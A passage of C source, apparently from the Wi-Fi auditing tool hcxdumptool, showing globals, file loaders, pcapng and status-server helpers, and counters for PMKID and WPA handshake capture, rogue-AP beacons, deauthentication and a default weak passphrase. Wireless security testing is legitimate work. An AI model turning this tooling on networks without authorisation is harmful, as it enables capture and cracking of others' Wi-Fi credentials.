#define _GNU_SOURCE
#include <ctype.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stddef.h>
#include <stdlib.h>
#include <stdbool.h>
#include <dirent.h>
#include <getopt.h>
#include <errno.h>
#include <string.h>
#include <fcntl.h>
#include <limits.h>
#include <time.h>
#include <signal.h>
#include <unistd.h>
#include <inttypes.h>
#include <linux/version.h>
#include <linux/ethtool.h>
#include <linux/sockios.h>
#include <linux/if_packet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <linux/if_ether.h>
#include <linux/filter.h>

#ifdef __ANDROID__
#include <libgen.h>
#include "include/android-ifaddrs/ifaddrs.h"
#include "include/android-ifaddrs/ifaddrs.c"
#else
#include <ifaddrs.h>
#endif

#include <net/if.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <openssl/conf.h>
#include <openssl/err.h>
#include <openssl/crypto.h>
#include <openssl/evp.h>
#include <openssl/ssl.h>

#include "include/hcxdumptool.h"
#include "include/rpigpio.h"
#include "include/wireless-lite.h"
#include "include/byteops.c"
#include "include/ieee80211.c"
#include "include/pcap.c"
#include "include/strings.c"
#include "include/hashops.c"
/*===========================================================================*/
/* global var */

static EVP_MAC *hmac;
static EVP_MAC *cmac;
static EVP_MAC_CTX *ctxhmac;
static EVP_MAC_CTX *ctxcmac;
static OSSL_PARAM paramsmd5[3];
static OSSL_PARAM paramssha1[3];
static OSSL_PARAM paramssha256[3];
static OSSL_PARAM paramsaes128[3];

static char *pcapngoutname;
static char *gpsname;

static char *filteraplistname;
static char *filterclientlistname;
static char *bpfcname;
static char *extaplistname;
static char *extapwpaentlistname;
static char *eapservercertname;
static char *eapserverkeyname;

static int opensslversionmajor;
static int opensslversionminor;

static SSL_CTX *tlsctx;
static eaptlsctx_t *eaptlsctx;

static fscanlist_t *ptrfscanlist;
static int fd_socket;
static int fd_gps;
static int fd_pcapng;
static int fd_socket_mccli;
static int fd_devnull;
static char *mcip;
static struct ip_mreq mcmreq;
static int fd_socket_mcsrv;
static struct sockaddr_in mcsrvaddress;
static struct sockaddr_in srvaddress;
static int fd_socket_srv;
static int interfacetxpwr;

static FILE *fh_nmea;
static struct ifreq ifr_old;
static struct iwreq iwr_old;

static bool gpiopresenceflag;
static bool forceinterfaceflag;
static bool targetscanflag;
static bool totflag;
static bool poweroffflag;
static bool rebootflag;
static bool wantstopflag;
static bool reloadfilesflag;
static bool beaconactiveflag;
static bool beaconfloodflag;
static bool gpsdflag;
static bool infinityflag;
static bool wpaentflag;
static bool eapreqflag;
static bool eapreqfollownakflag;
static bool eaptunflag;
static bool packetsentflag;
static int sl;
static int errorcount;
static int maxerrorcount;
static int radiotaperrorcount;
static int gpserrorcount;

static int pmkidcount;
static int pmkidroguecount;
static int eapolmp12count;
static int eapolmp12roguecount;
static int eapolmp23count;
static int eapolmp34count;
static int eapolmp34zeroedcount;
static int owm1m2roguemax;

static int gpscount;

static int rcaorder;
static unsigned int injectionhit;
static unsigned int responsehit;
static unsigned int injectioncount;
static unsigned int injectionratio;

static unsigned long int rpisn;
static int gpiostatusled;
static int gpiobutton;
static int gpiostatusledflashinterval;

static struct timespec sleepled;
static struct timespec sleepled2;
static struct timeval tv;
static time_t tvlast_sec;
static struct timeval tvold;
static struct timeval tvtot;
static struct timeval tvpacketsent;
static uint32_t staytime;
static uint16_t reasoncode;
static uint32_t attackcount;
static uint32_t attackstopcount;
static uint32_t attackresumecount;
static uint64_t timestamp;
static uint64_t timestampstart;
static uint64_t mytime;

static rth_t *rth;
static uint64_t incomingcount;
static uint64_t outgoingcount;

static uint32_t packetlenown;
static uint8_t *packetoutptr;

static uint8_t *packetptr;
static int packetlen;
static uint8_t *ieee82011ptr;
static uint32_t ieee82011len;
static uint8_t *llcptr;
static llc_t *llc;
static uint8_t *mpduptr;
static mpdu_t *mpdu;
static bool qosflag;

static int nmeatemplen;
static int nmealen;

static mac_t *macfrx;

static uint8_t *payloadptr;
static uint32_t payloadlen;

static int packetsentlen;
static uint8_t packetsenttries;

static maclist_t *filteraplist;
static maclist_t *filterclientlist;
static macessidlist_t *aplist;
static macessidlist_t *rglist;
static macessidlist_t *rgbeaconptr;
static macessidlist_t *rgbeaconlist;
static macessidlist_t *rgbeaconlistptr;

static ownlist_t *ownlist;
static pmklist_t *pmklist;

static pagidlist_t *pagidlist;
static scanlist_t *scanlist;
static eapreqlist_t *eapreqlist;

static int scanlistmax;

static int filteraplistentries;
static int filterclientlistentries;
static int filtermode;
static uint8_t fimacapsize;
static uint8_t fimacclientsize;
static int myreactivebeaconsequence;
static int eapreqentries;

static struct sock_fprog bpf;

static int aktchannel;

static uint16_t myapsequence;
static uint16_t myclientsequence;

static uint16_t mydeauthenticationsequence;
static uint16_t mydisassociationsequence;

static uint16_t beaconextlistlen;
static uint64_t eapoltimeoutvalue;
static uint64_t eapoleaptimeoutvalue;

static uint32_t statusout;
static uint32_t attackstatus;
static uint32_t pcapngframesout;
static enhanced_packet_block_t *epbhdr;
static enhanced_packet_block_t *epbhdrown;

static uint8_t weakcandidatelen;

static const char notavailablestr[] = "N/A";

static uint8_t hdradiotap[] =
{
0x00, 0x00, /* radiotap version and padding */
0x0c, 0x00, /* radiotap header length */
0x06, 0x80, 0x00, 0x00, /* bitmap */
0x00, /* all cleared */
0x02, /* rate */
0x18, 0x00 /* tx flags */
};
#define HDRRT_SIZE sizeof(hdradiotap)

static uint8_t hdradiotap_ack[] =
{
0x00, 0x00, /* radiotap version and padding */
0x0c, 0x00, /* radiotap header length */
0x06, 0x80, 0x00, 0x00, /* bitmap */
0x00, /* all cleared */
0x02, /* rate */
0x00, 0x00 /* tx flags */
};
#define HDRRTACK_SIZE sizeof(hdradiotap)

const char *channelscanlist1 = "1,6,11,3,5,1,6,11,2,4,1,6,11,7,9,1,6,11,8,10,1,6,11,12,13";
const char *channelscanlist2 = "1,2,3,4,5,6,7,8,9,10,11,12,13";
const char *channelscanlist3 = "36,40,44,48,52,56,60,64,100,104,108,112,116,120,124,128,132,136,140,144,149,153,157,161,165";
const char *channelscanlist4 = "1,2,3,4,5,6,7,8,9,10,11,12,13,36,40,44,48,52,56,60,64,100,104,108,112,116,120,124,128,132,136,140,144,149,153,157,161,165";

static char phyinterfacename[PHYIFNAMESIZE +1];
static char interfacename[IFNAMSIZ +1];

static fscanlist_t fscanlist[FSCANLIST_MAX +1];

static uint8_t myessid[] = { "home" };

static const char weakcandidatedefault[] = { "12345678" };

static char interfaceprotocol[IFNAMSIZ +1];

static char rssi;
static uint32_t myoui_client;
static uint32_t myoui_ap;
static uint32_t mynic_ap;

static char drivername[256];
static char driverversion[34];
static char driverfwversion[ETHTOOL_FWVERS_LEN +2];

static uint8_t mac_orig[6];
static uint8_t mac_virt[6];
static uint8_t mac_myclient[6];
static uint8_t mac_myprclient[6];
static uint8_t mac_myaphidden[6];
static uint8_t mac_myapopen[6];
static uint8_t mac_myap[6];

static uint64_t myrc;
static uint8_t myanonce[32];
static uint8_t mysnonce[32];

static char weakcandidate[64];

static uint8_t epb[PCAPNG_MAXSNAPLEN *2];
static uint8_t epbown[PCAPNG_MAXSNAPLEN *2];
static uint8_t packetsent[PCAPNG_MAXSNAPLEN *2];

static uint64_t lasttimestamp;
static uint8_t lastclient[6];
static uint8_t lastap[6];
static uint64_t lastrc;
static uint8_t lastkeyinfo;
static uint8_t lastkeyver;
static uint8_t lastanonce[32];
static uint8_t lastsnonce[32];

static uint64_t lastauthtimestamp;
static uint8_t lastauthclient[6];
static uint8_t lastauthap[6];
static uint8_t lastauthkeyver;

static char nmeatempsentence[NMEA_MAX];
static char nmeasentence[NMEA_MAX];

static char servermsg[SERVERMSG_MAX];

#ifdef DEBUG_TLS
static char debugmsg[DEBUGMSG_MAX];
#endif

static uint8_t reactivebeacondata[BEACONBODY_LEN_MAX];
static size_t reactivebeacondatalen;
static int reactivebeacondatachanoffset;
static uint8_t reactivebeaconwpaentdata[BEACONBODY_LEN_MAX];
static size_t reactivebeaconwpaentdatalen;
static int reactivebeaconwpaentdatachanoffset;
static uint8_t bcbeacondatahidden[BEACONBODY_LEN_MAX];
static size_t bcbeacondatahiddenlen;
static int bcbeacondatahiddenchanoffset;
static uint8_t bcbeacondataopen[BEACONBODY_LEN_MAX];
static size_t bcbeacondataopenlen;
static int bcbeacondataopenchanoffset;
/*===========================================================================*/
/*===========================================================================*/
static inline void debugprint2(int len, uint8_t *ptr1, uint8_t *ptr2, char *mesg)
{
static int p;

fprintf(stdout, "\n%s ", mesg);
for(p = 0; p < len; p++)
	{
	fprintf(stdout, "%02x", ptr1[p]);
	}
fprintf(stdout, " ");
for(p = 0; p < len; p++)
	{
	fprintf(stdout, "%02x", ptr2[p]);
	}
fprintf(stdout, "\n");
return;
}
/*===========================================================================*/
static inline void debugprint(int len, uint8_t *ptr, char *mesg)
{
static int p;

if(mesg != NULL) fprintf(stdout, "%s ", mesg);
for(p = 0; p < len; p++)
	{
	fprintf(stdout, "%02x", ptr[p]);
	}
fprintf(stdout, "\n");
return;
}
/*===========================================================================*/
static inline void serversendstatus(char *text, int len)
{
static int written;
static uint8_t msgtype;
static struct msghdr msg;
static struct iovec iov[2];

if(!(((statusout &STATUS_SERVER) == STATUS_SERVER) && (fd_socket_mcsrv > 0))) return;
msgtype = SERVERMSG_TYPE_STATUS;
iov[0].iov_base = (void*)&msgtype;
iov[0].iov_len = sizeof(msgtype);
msg.msg_iov = iov;
msg.msg_iovlen = 2;
msg.msg_name = (struct sockaddr*)&mcsrvaddress;
msg.msg_namelen = sizeof(mcsrvaddress);
while(len > 0)
	{
	iov[1].iov_base = (void*)text;
	if(len > (SERVERMSG_MAX -SERVERMSG_HEAD_SIZE))
		iov[1].iov_len = (SERVERMSG_MAX -SERVERMSG_HEAD_SIZE);
	else iov[1].iov_len = len;
	written = sendmsg(fd_socket_mcsrv, &msg, 0);
	if(written != (len +SERVERMSG_HEAD_SIZE)) errorcount++;
	len -= iov[1].iov_len;
	text = &text[iov[1].iov_len];
	}
return;
}
/*===========================================================================*/
static inline void serversendpcapng(uint8_t *pcapng, int len)
{
static int written;
static int i;
static uint8_t msgtype;
static struct msghdr msg;
static struct iovec iov[2];

if(!(((statusout &STATUS_SERVER) == STATUS_SERVER) && (fd_socket_mcsrv > 0))) return;
msgtype = SERVERMSG_TYPE_PCAPNG;
iov[0].iov_base = (void*)&msgtype;
iov[0].iov_len = sizeof(msgtype);
msg.msg_iov = iov;
msg.msg_iovlen = 2;
msg.msg_name = (struct sockaddr*)&mcsrvaddress;
msg.msg_namelen = sizeof(mcsrvaddress);
i=0;
while(len > 0)
	{
	i++;
	iov[1].iov_base = (void*)pcapng;
	if(len > (SERVERMSG_MAX -SERVERMSG_HEAD_SIZE))
		iov[1].iov_len = (SERVERMSG_MAX -SERVERMSG_HEAD_SIZE);
	else iov[1].iov_len = len;
	written = sendmsg(fd_socket_mcsrv, &msg, 0);
	if(written != (len +SERVERMSG_HEAD_SIZE)) errorcount++;
	len -= iov[1].iov_len;
	pcapng = &pcapng[iov[1].iov_len];
	}
return;
}
/*===========================================================================*/
static inline void clientrequestpcapnghead(struct sockaddr *sockaddrFrom, int sockaddrFrom_len)
{
static int written;
static uint8_t clientstatus[2];

clientstatus[0] = SERVERMSG_TYPE_CONTROL;
clientstatus[1] = SERVERMSG_CONTROL_SENDPCAPNGHEAD;
written = sendto(fd_socket_mccli, clientstatus, 2, 0, (struct sockaddr*)sockaddrFrom, sockaddrFrom_len);
if(written != (SERVERMSG_HEAD_SIZE +1))
	{
	perror("clientpcapngheadrequest failed");
	errorcount++;
	}
return;
}
/*===========================================================================*/
static inline bool ismulticastip(char *ip)
{
return ((ntohl(inet_addr(ip)) & 0xf0000000) == 0xe0000000);
}
/*===========================================================================*/
/*===========================================================================*/
__attribute__ ((noreturn))
static void globalclose()
{
static struct ifreq ifr;
static const char *gpsd_disable = "?WATCH={\"enable\":false}";

fprintf(stdout, "\nterminating...\e[?25h\n");
sync();
errorcount -= radiotaperrorcount;
errorcount -= gpserrorcount;
if(errorcount == 1) fprintf(stdout, "%d driver error encountered\nusually this error is related to pselect() after SIGTERM has been received\n", errorcount);
if(errorcount > 1) fprintf(stdout, "%d driver errors encountered\n", errorcount);
if(radiotaperrorcount == 1) fprintf(stdout, "%d radiotap error encountered\n", radiotaperrorcount);
if(radiotaperrorcount > 1) fprintf(stdout, "%d radiotap errors encountered\n", radiotaperrorcount);
if(gpserrorcount == 1) fprintf(stdout, "%d GPS error encountered\n", gpserrorcount);
if(gpserrorcount > 1) fprintf(stdout, "%d GPS errors encountered\n", gpserrorcount);
if((errorcount > 0) && (errorcount < 10)) fprintf(stdout, "ERRORs < 10 are related to a slow initialization and can be ignored\n");
if(((statusout &STATUS_SERVER) == STATUS_SERVER) && (fd_socket_mcsrv > 0)) serversendstatus("bye bye hcxdumptool clients...\n", sizeof ("bye bye hcxdumptool clients...\n"));
if((gpiopresenceflag == true) && (gpiostatusled > 0))
	{
	GPIO_CLR = 1 << gpiostatusled;
	nanosleep(&sleepled, NULL);
	GPIO_SET = 1 << gpiostatusled;
	nanosleep(&sleepled, NULL);
	GPIO_CLR = 1 << gpiostatusled;
	nanosleep(&sleepled, NULL);
	GPIO_SET = 1 << gpiostatusled;
	nanosleep(&sleepled, NULL);
	}
if(fd_socket > 0)
	{
	if(bpf.filter != NULL)
		{
		if(setsockopt(fd_socket, SOL_SOCKET, SO_DETACH_FILTER, &bpf, sizeof(bpf)) < 0) perror("failed to free BPF code");
		}
	memset(&ifr, 0, sizeof(ifr));
	memcpy(&ifr.ifr_name, interfacename, IFNAMSIZ);
	if(ioctl(fd_socket, SIOCGIFFLAGS, &ifr) < 0) perror("failed to get interface information");
	ifr.ifr_flags = 0;
	if(ioctl(fd_socket, SIOCSIFFLAGS, &ifr) < 0) perror("failed to set interface down");
	if(ioctl(fd_socket, SIOCSIWMODE, &iwr_old) < 0) perror("failed to restore old SIOCSIWMODE");
	if(ioctl(fd_socket, SIOCSIFFLAGS, &ifr_old) < 0) perror("failed to restore old SIOCSIFFLAGS and to bring interface up");
	if(close(fd_socket) != 0) perror("failed to close raw socket");
	}
if(fd_gps > 0)
	{
	if(gpsdflag == true)
		{
		if(write(fd_gps, gpsd_disable, 23) != 23) perror("failed to terminate GPSD WATCH");
		}
	if(close(fd_gps) != 0) perror("failed to close GPS device");
	}
if(fd_socket_mccli > 0)
	{
	if(ismulticastip(mcip) == true)
		{
		memset(&mcmreq, 0, sizeof(mcmreq));
		mcmreq.imr_multiaddr.s_addr = inet_addr(mcip);
		mcmreq.imr_interface.s_addr = htonl(INADDR_ANY);
		if(setsockopt(fd_socket_mccli, IPPROTO_IP, IP_DROP_MEMBERSHIP, &mcmreq, sizeof(mcmreq)) < 0) perror("failed to drop ip-membership");
		}
	if(close(fd_socket_mccli) != 0) perror("failed to close client socket");
	}
if(fd_socket_mcsrv > 0)
	{
	if(close(fd_socket_mcsrv) != 0) perror("failed to close server socket");
	}
if((fd_pcapng > 0) && (pcapngoutname != NULL) && (fd_pcapng != fd_socket_mcsrv))
	{
	if(close(fd_pcapng) != 0) perror("failed to close PCAPNG dump file");
	}
if(fh_nmea != NULL)
	{
	if(fclose(fh_nmea) != 0) perror("failed to close NMEA 0183 dump file");
	}
if(filteraplist != NULL) free(filteraplist);
if(filterclientlist != NULL) free(filterclientlist);
if(aplist != NULL) free(aplist);
if(rglist != NULL) free(rglist);
if(rgbeaconlist != NULL) free(rgbeaconlist);
if(ownlist != NULL) free(ownlist);
if(pmklist != NULL) free(pmklist);
if(pagidlist != NULL) free(pagidlist);
if(scanlist != NULL) free(scanlist);
if(bpf.filter != NULL) free(bpf.filter);
if(eaptlsctx != NULL)
	{
	if(eaptlsctx->ssl != NULL) SSL_free(eaptlsctx->ssl);
	free(eaptlsctx);
	}
if(poweroffflag == true)
	{
	if(system("poweroff") != 0)
		{
		fprintf(stderr, "can't power off\n");
		exit(EXIT_FAILURE);
		}
	}
if(rebootflag == true)
	{
	if(system("reboot") != 0)
		{
		fprintf(stderr, "can't reboot\n");
		exit(EXIT_FAILURE);
		}
	}
if(errorcount != 0) exit(EXIT_FAILURE);
if(totflag == true) exit(USER_EXIT_TOT);
exit(EXIT_SUCCESS);
}
/*===========================================================================*/
static inline void programmende(int signum)
{
if((signum == SIGINT) || (signum == SIGTERM) || (signum == SIGKILL)) wantstopflag = true;
return;
}
/*===========================================================================*/
/*===========================================================================*/
static inline void reloadfiles(int signum)
{
if((signum == SIGHUP) && (filteraplistname || filterclientlistname || bpfcname || extaplistname || extapwpaentlistname)) reloadfilesflag = true;
return;
}
/*===========================================================================*/
static inline size_t chop(char *buffer, size_t len)
{
static char *ptr;

ptr = buffer +len -1;
while(len)
	{
	if(*ptr != '\n') break;
	*ptr-- = 0;
	len--;
	}
while(len)
	{
	if(*ptr != '\r') break;
	*ptr-- = 0;
	len--;
	}
return len;
}
/*---------------------------------------------------------------------------*/
static inline int fgetline(FILE *inputstream, size_t size, char *buffer)
{
static size_t len;
static char *buffptr;

if(feof(inputstream)) return -1;
buffptr = fgets (buffer, size, inputstream);
if(buffptr == NULL) return -1;
len = strlen(buffptr);
len = chop(buffptr, len);
return len;
}
/*===========================================================================*/
static inline void readextbeaconlist(char *listname, uint16_t akm, bool reload)
{
static int len;
static FILE *fh_extbeacon;
static macessidlist_t *zeiger;
static macessidlist_t *list;
static char linein[ESSID_LEN_MAX];
bool skipline;

if((fh_extbeacon = fopen(listname, "r")) == NULL)
	{
	fprintf(stderr, "failed to open beacon list %s\n", listname);
	return;
	}
if(beaconactiveflag == true) list = rglist;
else
	{
	list = rgbeaconlist;
	memset(rgbeaconlist, 0, RGLIST_MAX *MACESSIDLIST_SIZE);
	}
zeiger = list;
if(reload == false)
	{
	for(; zeiger < list +RGLIST_MAX; zeiger++)
		{
		if(zeiger->timestamp == 0) break;
		}
	}
gettimeofday(&tv, NULL);
timestamp = ((uint64_t)tv.tv_sec *1000000) +tv.tv_usec -512;
while(beaconextlistlen < BEACONEXTLIST_MAX)
	{
	if((len = fgetline(fh_extbeacon, ESSID_LEN_MAX, linein)) == -1) break;
	if((len == 0) || (len > 32)) continue;
	if((reload == true) && (beaconactiveflag == true))
		{
		skipline = false;
		for(zeiger = list; zeiger < list +RGLIST_MAX; zeiger++)
			{
			if(zeiger->timestamp == 0) break;
			if(zeiger->essidlen != len) continue;
			if(memcmp(zeiger->essid, linein, len) != 0) continue;
			skipline = true;
			break;
			}
		if(skipline == true) continue;
		}
	memset(zeiger, 0, MACESSIDLIST_SIZE);
	zeiger->timestamp = timestamp;
	zeiger->count = 1;
	memcpy(zeiger->ap, &mac_myap, 3);
	zeiger->ap[3] = (mynic_ap >> 16) & 0xff;
	zeiger->ap[4] = (mynic_ap >> 8) & 0xff;
	zeiger->ap[5] = mynic_ap & 0xff;
	mynic_ap++;
	zeiger->essidlen = len;
	memcpy(zeiger->essid, linein, len);
	zeiger->akm = akm;
	timestamp++;
	zeiger++;
	beaconextlistlen++;
	}
fclose(fh_extbeacon);
return;
}
/*===========================================================================*/
static inline int readmaclist(char *listname, maclist_t *maclist, uint8_t filtermacsize)
{
static int len;
static int c, i, o;
static int entries;
static maclist_t *zeiger;
static FILE *fh_filter;
static char linein[FILTERLIST_LINE_LEN];

entries = 0;
c = 0;
zeiger = maclist;
if((fh_filter = fopen(listname, "r")) == NULL)
	{
	len = strlen(listname);
	if((len < (2 *filtermacsize)) || (len >= FILTERLIST_LINE_LEN))
		{
		fprintf(stderr, "failed to open filter list %s\n", listname);
		return 0;
		}
	o = 0;
	for(i = 0; i < len; i++)
		{
		if(isxdigit(listname[i]))
			{
			linein[o] = listname[i];
			o++;
			}
		}
	if(hex2bin(&linein[0x0], zeiger->mac, filtermacsize) == false)
		{
		fprintf(stderr, "failed to process filter MAC %s\n", listname);
		return 0;
		}
	zeiger++;
	entries++;
	return entries;
	}
while(entries < FILTERLIST_MAX)
	{
	if((len = fgetline(fh_filter, FILTERLIST_LINE_LEN, linein)) == -1) break;
	if(len < (2 *filtermacsize))
		{
		c++;
		continue;
		}
	if(linein[0x0] == '#')
		{
		c++;
		continue;
		}
	o = 0;
	for(i = 0; i < len; i++)
		{
		if(isxdigit(linein[i]))
			{
			linein[o] = linein[i];
			o++;
			}
		}
	if(hex2bin(&linein[0x0], zeiger->mac, filtermacsize) == true)
		{
		zeiger++;
		entries++;
		}
	else fprintf(stderr, "failed to read filter list line %d: %s\n", c, linein);
	c++;
	}
qsort(maclist, entries, MACLIST_SIZE, sort_maclist);
fclose(fh_filter);
return entries;
}
/*===========================================================================*/
static inline void readbpfc(char *bpfname)
{
static int len;
static uint16_t c;
static struct sock_filter *zeiger;
static FILE *fh_filter;
static char linein[128];

if((fh_filter = fopen(bpfname, "r")) == NULL)
	{
	fprintf(stderr, "failed to open Berkeley Packet Filter list %s\n", bpfname);
	return;
	}
if((len = fgetline(fh_filter, 128, linein)) == -1)
	{
	fclose(fh_filter);
	fprintf(stderr, "failed to read Berkeley Packet Filter array size\n");
	return;
	}
sscanf(linein, "%"SCNu16, &bpf.len);
if(bpf.len == 0)
	{
	fclose(fh_filter);
	fprintf(stderr, "failed to read Berkeley Packet Filter array size\n");
	return;
	}
bpf.filter = (struct sock_filter*)calloc(bpf.len, sizeof(struct sock_filter));
c = 0;
zeiger = bpf.filter;
while(c < bpf.len)
	{
	if((len = fgetline(fh_filter, 128, linein)) == -1)
		{
		bpf.len = 0;
		break;
		}
	sscanf(linein, "%" SCNu16 "%" SCNu8 "%" SCNu8 "%" SCNu32, &zeiger->code, &zeiger->jt, &zeiger->jf, &zeiger->k);
	zeiger++;
	c++;
	}
if(bpf.len != c) fprintf(stderr, "failed to read Berkeley Packet Filter\n");
fclose(fh_filter);
return;
}
/*===========================================================================*/
static inline void loadfiles()
{
if((reloadfilesflag == true) && (fd_socket > 0) && (bpf.filter != NULL))
	{
	if(setsockopt(fd_socket, SOL_SOCKET, SO_DETACH_FILTER, &bpf, sizeof(bpf)) < 0) perror("failed to free BPF code");
	if(bpf.filter != NULL) free(bpf.filter);
	}
if(filteraplistname != NULL) filteraplistentries = readmaclist(filteraplistname, filteraplist, fimacapsize);
if(filterclientlistname != NULL) filterclientlistentries = readmaclist(filterclientlistname, filterclientlist, fimacclientsize);
if(bpfcname != NULL) readbpfc(bpfcname);
if(extaplistname != NULL) readextbeaconlist(extaplistname, TAK_PSK, reloadfilesflag);
if(extapwpaentlistname != NULL) readextbeaconlist(extapwpaentlistname, TAK_PMKSA, reloadfilesflag);
if(reloadfilesflag == true)
	{
	if(bpf.len > 0)
		{
		if(setsockopt(fd_socket, SOL_SOCKET, SO_ATTACH_FILTER, &bpf, sizeof(bpf)) < 0) perror("failed to set Berkeley Packet Filter");
		}
	reloadfilesflag = false;
	}
return;
}
/*===========================================================================*/
/*===========================================================================*/
static inline void printreceivewatchdogwarnung()
{
static char timestring[16];

strftime(timestring, 16, "%H:%M:%S", localtime(&tv.tv_sec));
if(ptrfscanlist->channel >= 100) snprintf(servermsg, SERVERMSG_MAX, "%s %d/%d   WARNING RECEIVE TIMEOUT: NO PACKETS RECEIVED SINC %ld SECONDS\n", timestring, ptrfscanlist->frequency, ptrfscanlist->channel, tv.tv_sec -tvlast_sec);
else if(ptrfscanlist->channel >= 10) snprintf(servermsg, SERVERMSG_MAX, "%s %d/%d    WARNING RECEIVE TIMEOUT: NO PACKETS RECEIVED SINC %ld SECONDS\n", timestring, ptrfscanlist->frequency, ptrfscanlist->channel, tv.tv_sec -tvlast_sec);
else snprintf(servermsg, SERVERMSG_MAX, "%s %d/%d     WARNING RECEIVE TIMEOUT: NO PACKETS RECEIVED SINC %ld SECONDS\n", timestring, ptrfscanlist->frequency, ptrfscanlist->channel, tv.tv_sec -tvlast_sec);
if(((statusout &STATUS_SERVER) == STATUS_SERVER) && (fd_socket_mcsrv > 0)) serversendstatus(servermsg, strlen(servermsg));
else fprintf(stdout, "%s", servermsg);
return;
}
/*===========================================================================*/
static inline void printtimestatus()
{
static char timestring[16];

strftime(timestring, 16, "%H:%M:%S", localtime(&tv.tv_sec));
if(ptrfscanlist->channel >= 100) snprintf(servermsg, SERVERMSG_MAX, "%s %d/%d   ERROR:%d INCOMING:%" PRIu64 " AGE:%ld OUTGOING:%" PRIu64 " PMKIDROGUE:%d PMKID:%d M1M2ROGUE:%d M1M2:%d M2M3:%d M3M4:%d M3M4ZEROED:%d GPS:%d\n", timestring, ptrfscanlist->frequency, ptrfscanlist->channel,
				errorcount, incomingcount, tv.tv_sec -tvlast_sec, outgoingcount, pmkidroguecount, pmkidcount, eapolmp12roguecount, eapolmp12count, eapolmp23count, eapolmp34count, eapolmp34zeroedcount, gpscount);
else if(ptrfscanlist->channel >= 10) snprintf(servermsg, SERVERMSG_MAX, "%s %d/%d    ERROR:%d INCOMING:%" PRIu64 " AGE:%ld OUTGOING:%" PRIu64 " PMKIDROGUE:%d PMKID:%d M1M2ROGUE:%d M1M2:%d M2M3:%d M3M4:%d M3M4ZEROED:%d GPS:%d\n", timestring, ptrfscanlist->frequency, ptrfscanlist->channel,
				errorcount, incomingcount, tv.tv_sec -tvlast_sec, outgoingcount, pmkidroguecount, pmkidcount, eapolmp12roguecount, eapolmp12count, eapolmp23count, eapolmp34count, eapolmp34zeroedcount, gpscount);
else snprintf(servermsg, SERVERMSG_MAX, "%s %d/%d     ERROR:%d INCOMING:%" PRIu64 " AGE:%ld OUTGOING:%" PRIu64 " PMKIDROGUE:%d PMKID:%d M1M2ROGUE:%d M1M2:%d M2M3:%d M3M4:%d M3M4ZEROED:%d GPS:%d\n", timestring, ptrfscanlist->frequency, ptrfscanlist->channel,
			errorcount, incomingcount, tv.tv_sec -tvlast_sec, outgoingcount, pmkidroguecount, pmkidcount, eapolmp12roguecount, eapolmp12count, eapolmp23count, eapolmp34count, eapolmp34zeroedcount, gpscount);
if(((statusout &STATUS_SERVER) == STATUS_SERVER) && (fd_socket_mcsrv > 0)) serversendstatus(servermsg, strlen(servermsg));
else fprintf(stdout, "%s", servermsg);
return;
}
/*===========================================================================*/
static inline void printposition()
{
static char timestring[16];

strftime(timestring, 16, "%H:%M:%S", localtime(&tv.tv_sec));
if(ptrfscanlist->channel >= 100) snprintf(servermsg, SERVERMSG_MAX, "%s %d/%d   INFO GPS:%s\n", timestring, ptrfscanlist->frequency, ptrfscanlist->channel, &nmeasentence[7]);
else if(ptrfscanlist->channel >= 10) snprintf(servermsg, SERVERMSG_MAX, "%s %d/%d    INFO GPS:%s\n", timestring, ptrfscanlist->frequency, ptrfscanlist->channel, &nmeasentence[7]);
else snprintf(servermsg, SERVERMSG_MAX, "%s %d/%d     INFO GPS:%s\n", timestring, ptrfscanlist->frequency, ptrfscanlist->channel, &nmeasentence[7]);
if(((statusout &STATUS_SERVER) == STATUS_SERVER) && (fd_socket_mcsrv > 0)) serversendstatus(servermsg, strlen(servermsg));
else fprintf(stdout, "%s", servermsg);
return;
}
/*===========================================================================*/
static inline void printstatusap(uint8_t *toaddr, macessidlist_t *zeiger, char *msg)
{
static int p, c;
static char timestring[16];
static char essidstring[ESSID_LEN_MAX *2 +1];

strftime(timestring, 16, "%H:%M:%S", localtime(&tv.tv_sec));
if((zeiger->essidlen == 0) || (zeiger->essid[0] == 0))
	{
	if(ptrfscanlist->channel >= 100) snprintf(servermsg, SERVERMSG_MAX, "%s %d/%d %02x%02x%02x%02x%02x%02x %02x%02x%02x%02x%02x%02x [WILDCARD %s]\n", timestring, ptrfscanlist->frequency, ptrfscanlist->channel,
					toaddr[0], toaddr[1], toaddr[2], toaddr[3], toaddr[4], toaddr[5],
					zeiger->ap[0], zeiger->ap[1], zeiger->ap[2], zeiger->ap[3], zeiger->ap[4], zeiger->ap[5], msg);
	else if(ptrfscanlist->channel >= 10) snprintf(servermsg, SERVERMSG_MAX, "%s %d/%d  %02x%02x%02x%02x%02x%02x %02x%02x%02x%02x%02x%02x [WILDCARD %s]\n", timestring, ptrfscanlist->frequency, ptrfscanlist->channel,
					toaddr[0], toaddr[1], toaddr[2], toaddr[3], toaddr[4], toaddr[5],
					zeiger->ap[0], zeiger->ap[1], zeiger->ap[2], zeiger->ap[3], zeiger->ap[4], zeiger->ap[5], msg);
	else snprintf(servermsg, SERVERMSG_MAX, "%s %d/%d   %02x%02x%02x%02x%02x%02x %02x%02x%02x%02x%02x%02x [WILDCARD %s]\n", timestring, ptrfscanlist->frequency, ptrfscanlist->channel,
			toaddr[0], toaddr[1], toaddr[2], toaddr[3], toaddr[4], toaddr[5],
			zeiger->ap[0], zeiger->ap[1], zeiger->ap[2], zeiger->ap[3], zeiger->ap[4], zeiger->ap[5], msg);
	if(((statusout &STATUS_SERVER) == STATUS_SERVER) && (fd_socket_mcsrv > 0)) serversendstatus(servermsg, strlen(servermsg));
	else fprintf(stdout, "%s", servermsg);
	return;
	}
p = 0;
for(c = 0; c < zeiger->essidlen; c++)
	{
	if((zeiger->essid[c] < 0x20) || (zeiger->essid[c] > 0x7e)) essidstring[p++] = '.';
	else if(zeiger->essid[c] == 0x5c)
		{
		essidstring[p++] = 0x5c;
		essidstring[p++] = 0x5c;
		}
	else essidstring[p++] = zeiger->essid[c];
	}
essidstring[p] = 0;
if(ptrfscanlist->channel >= 100) snprintf(servermsg, SERVERMSG_MAX, "%s %d/%d %02x%02x%02x%02x%02x%02x %02x%02x%02x%02x%02x%02x %s [%s]\n", timestring, ptrfscanlist->frequency, ptrfscanlist->channel,
			toaddr[0], toaddr[1], toaddr[2], toaddr[3], toaddr[4], toaddr[5],
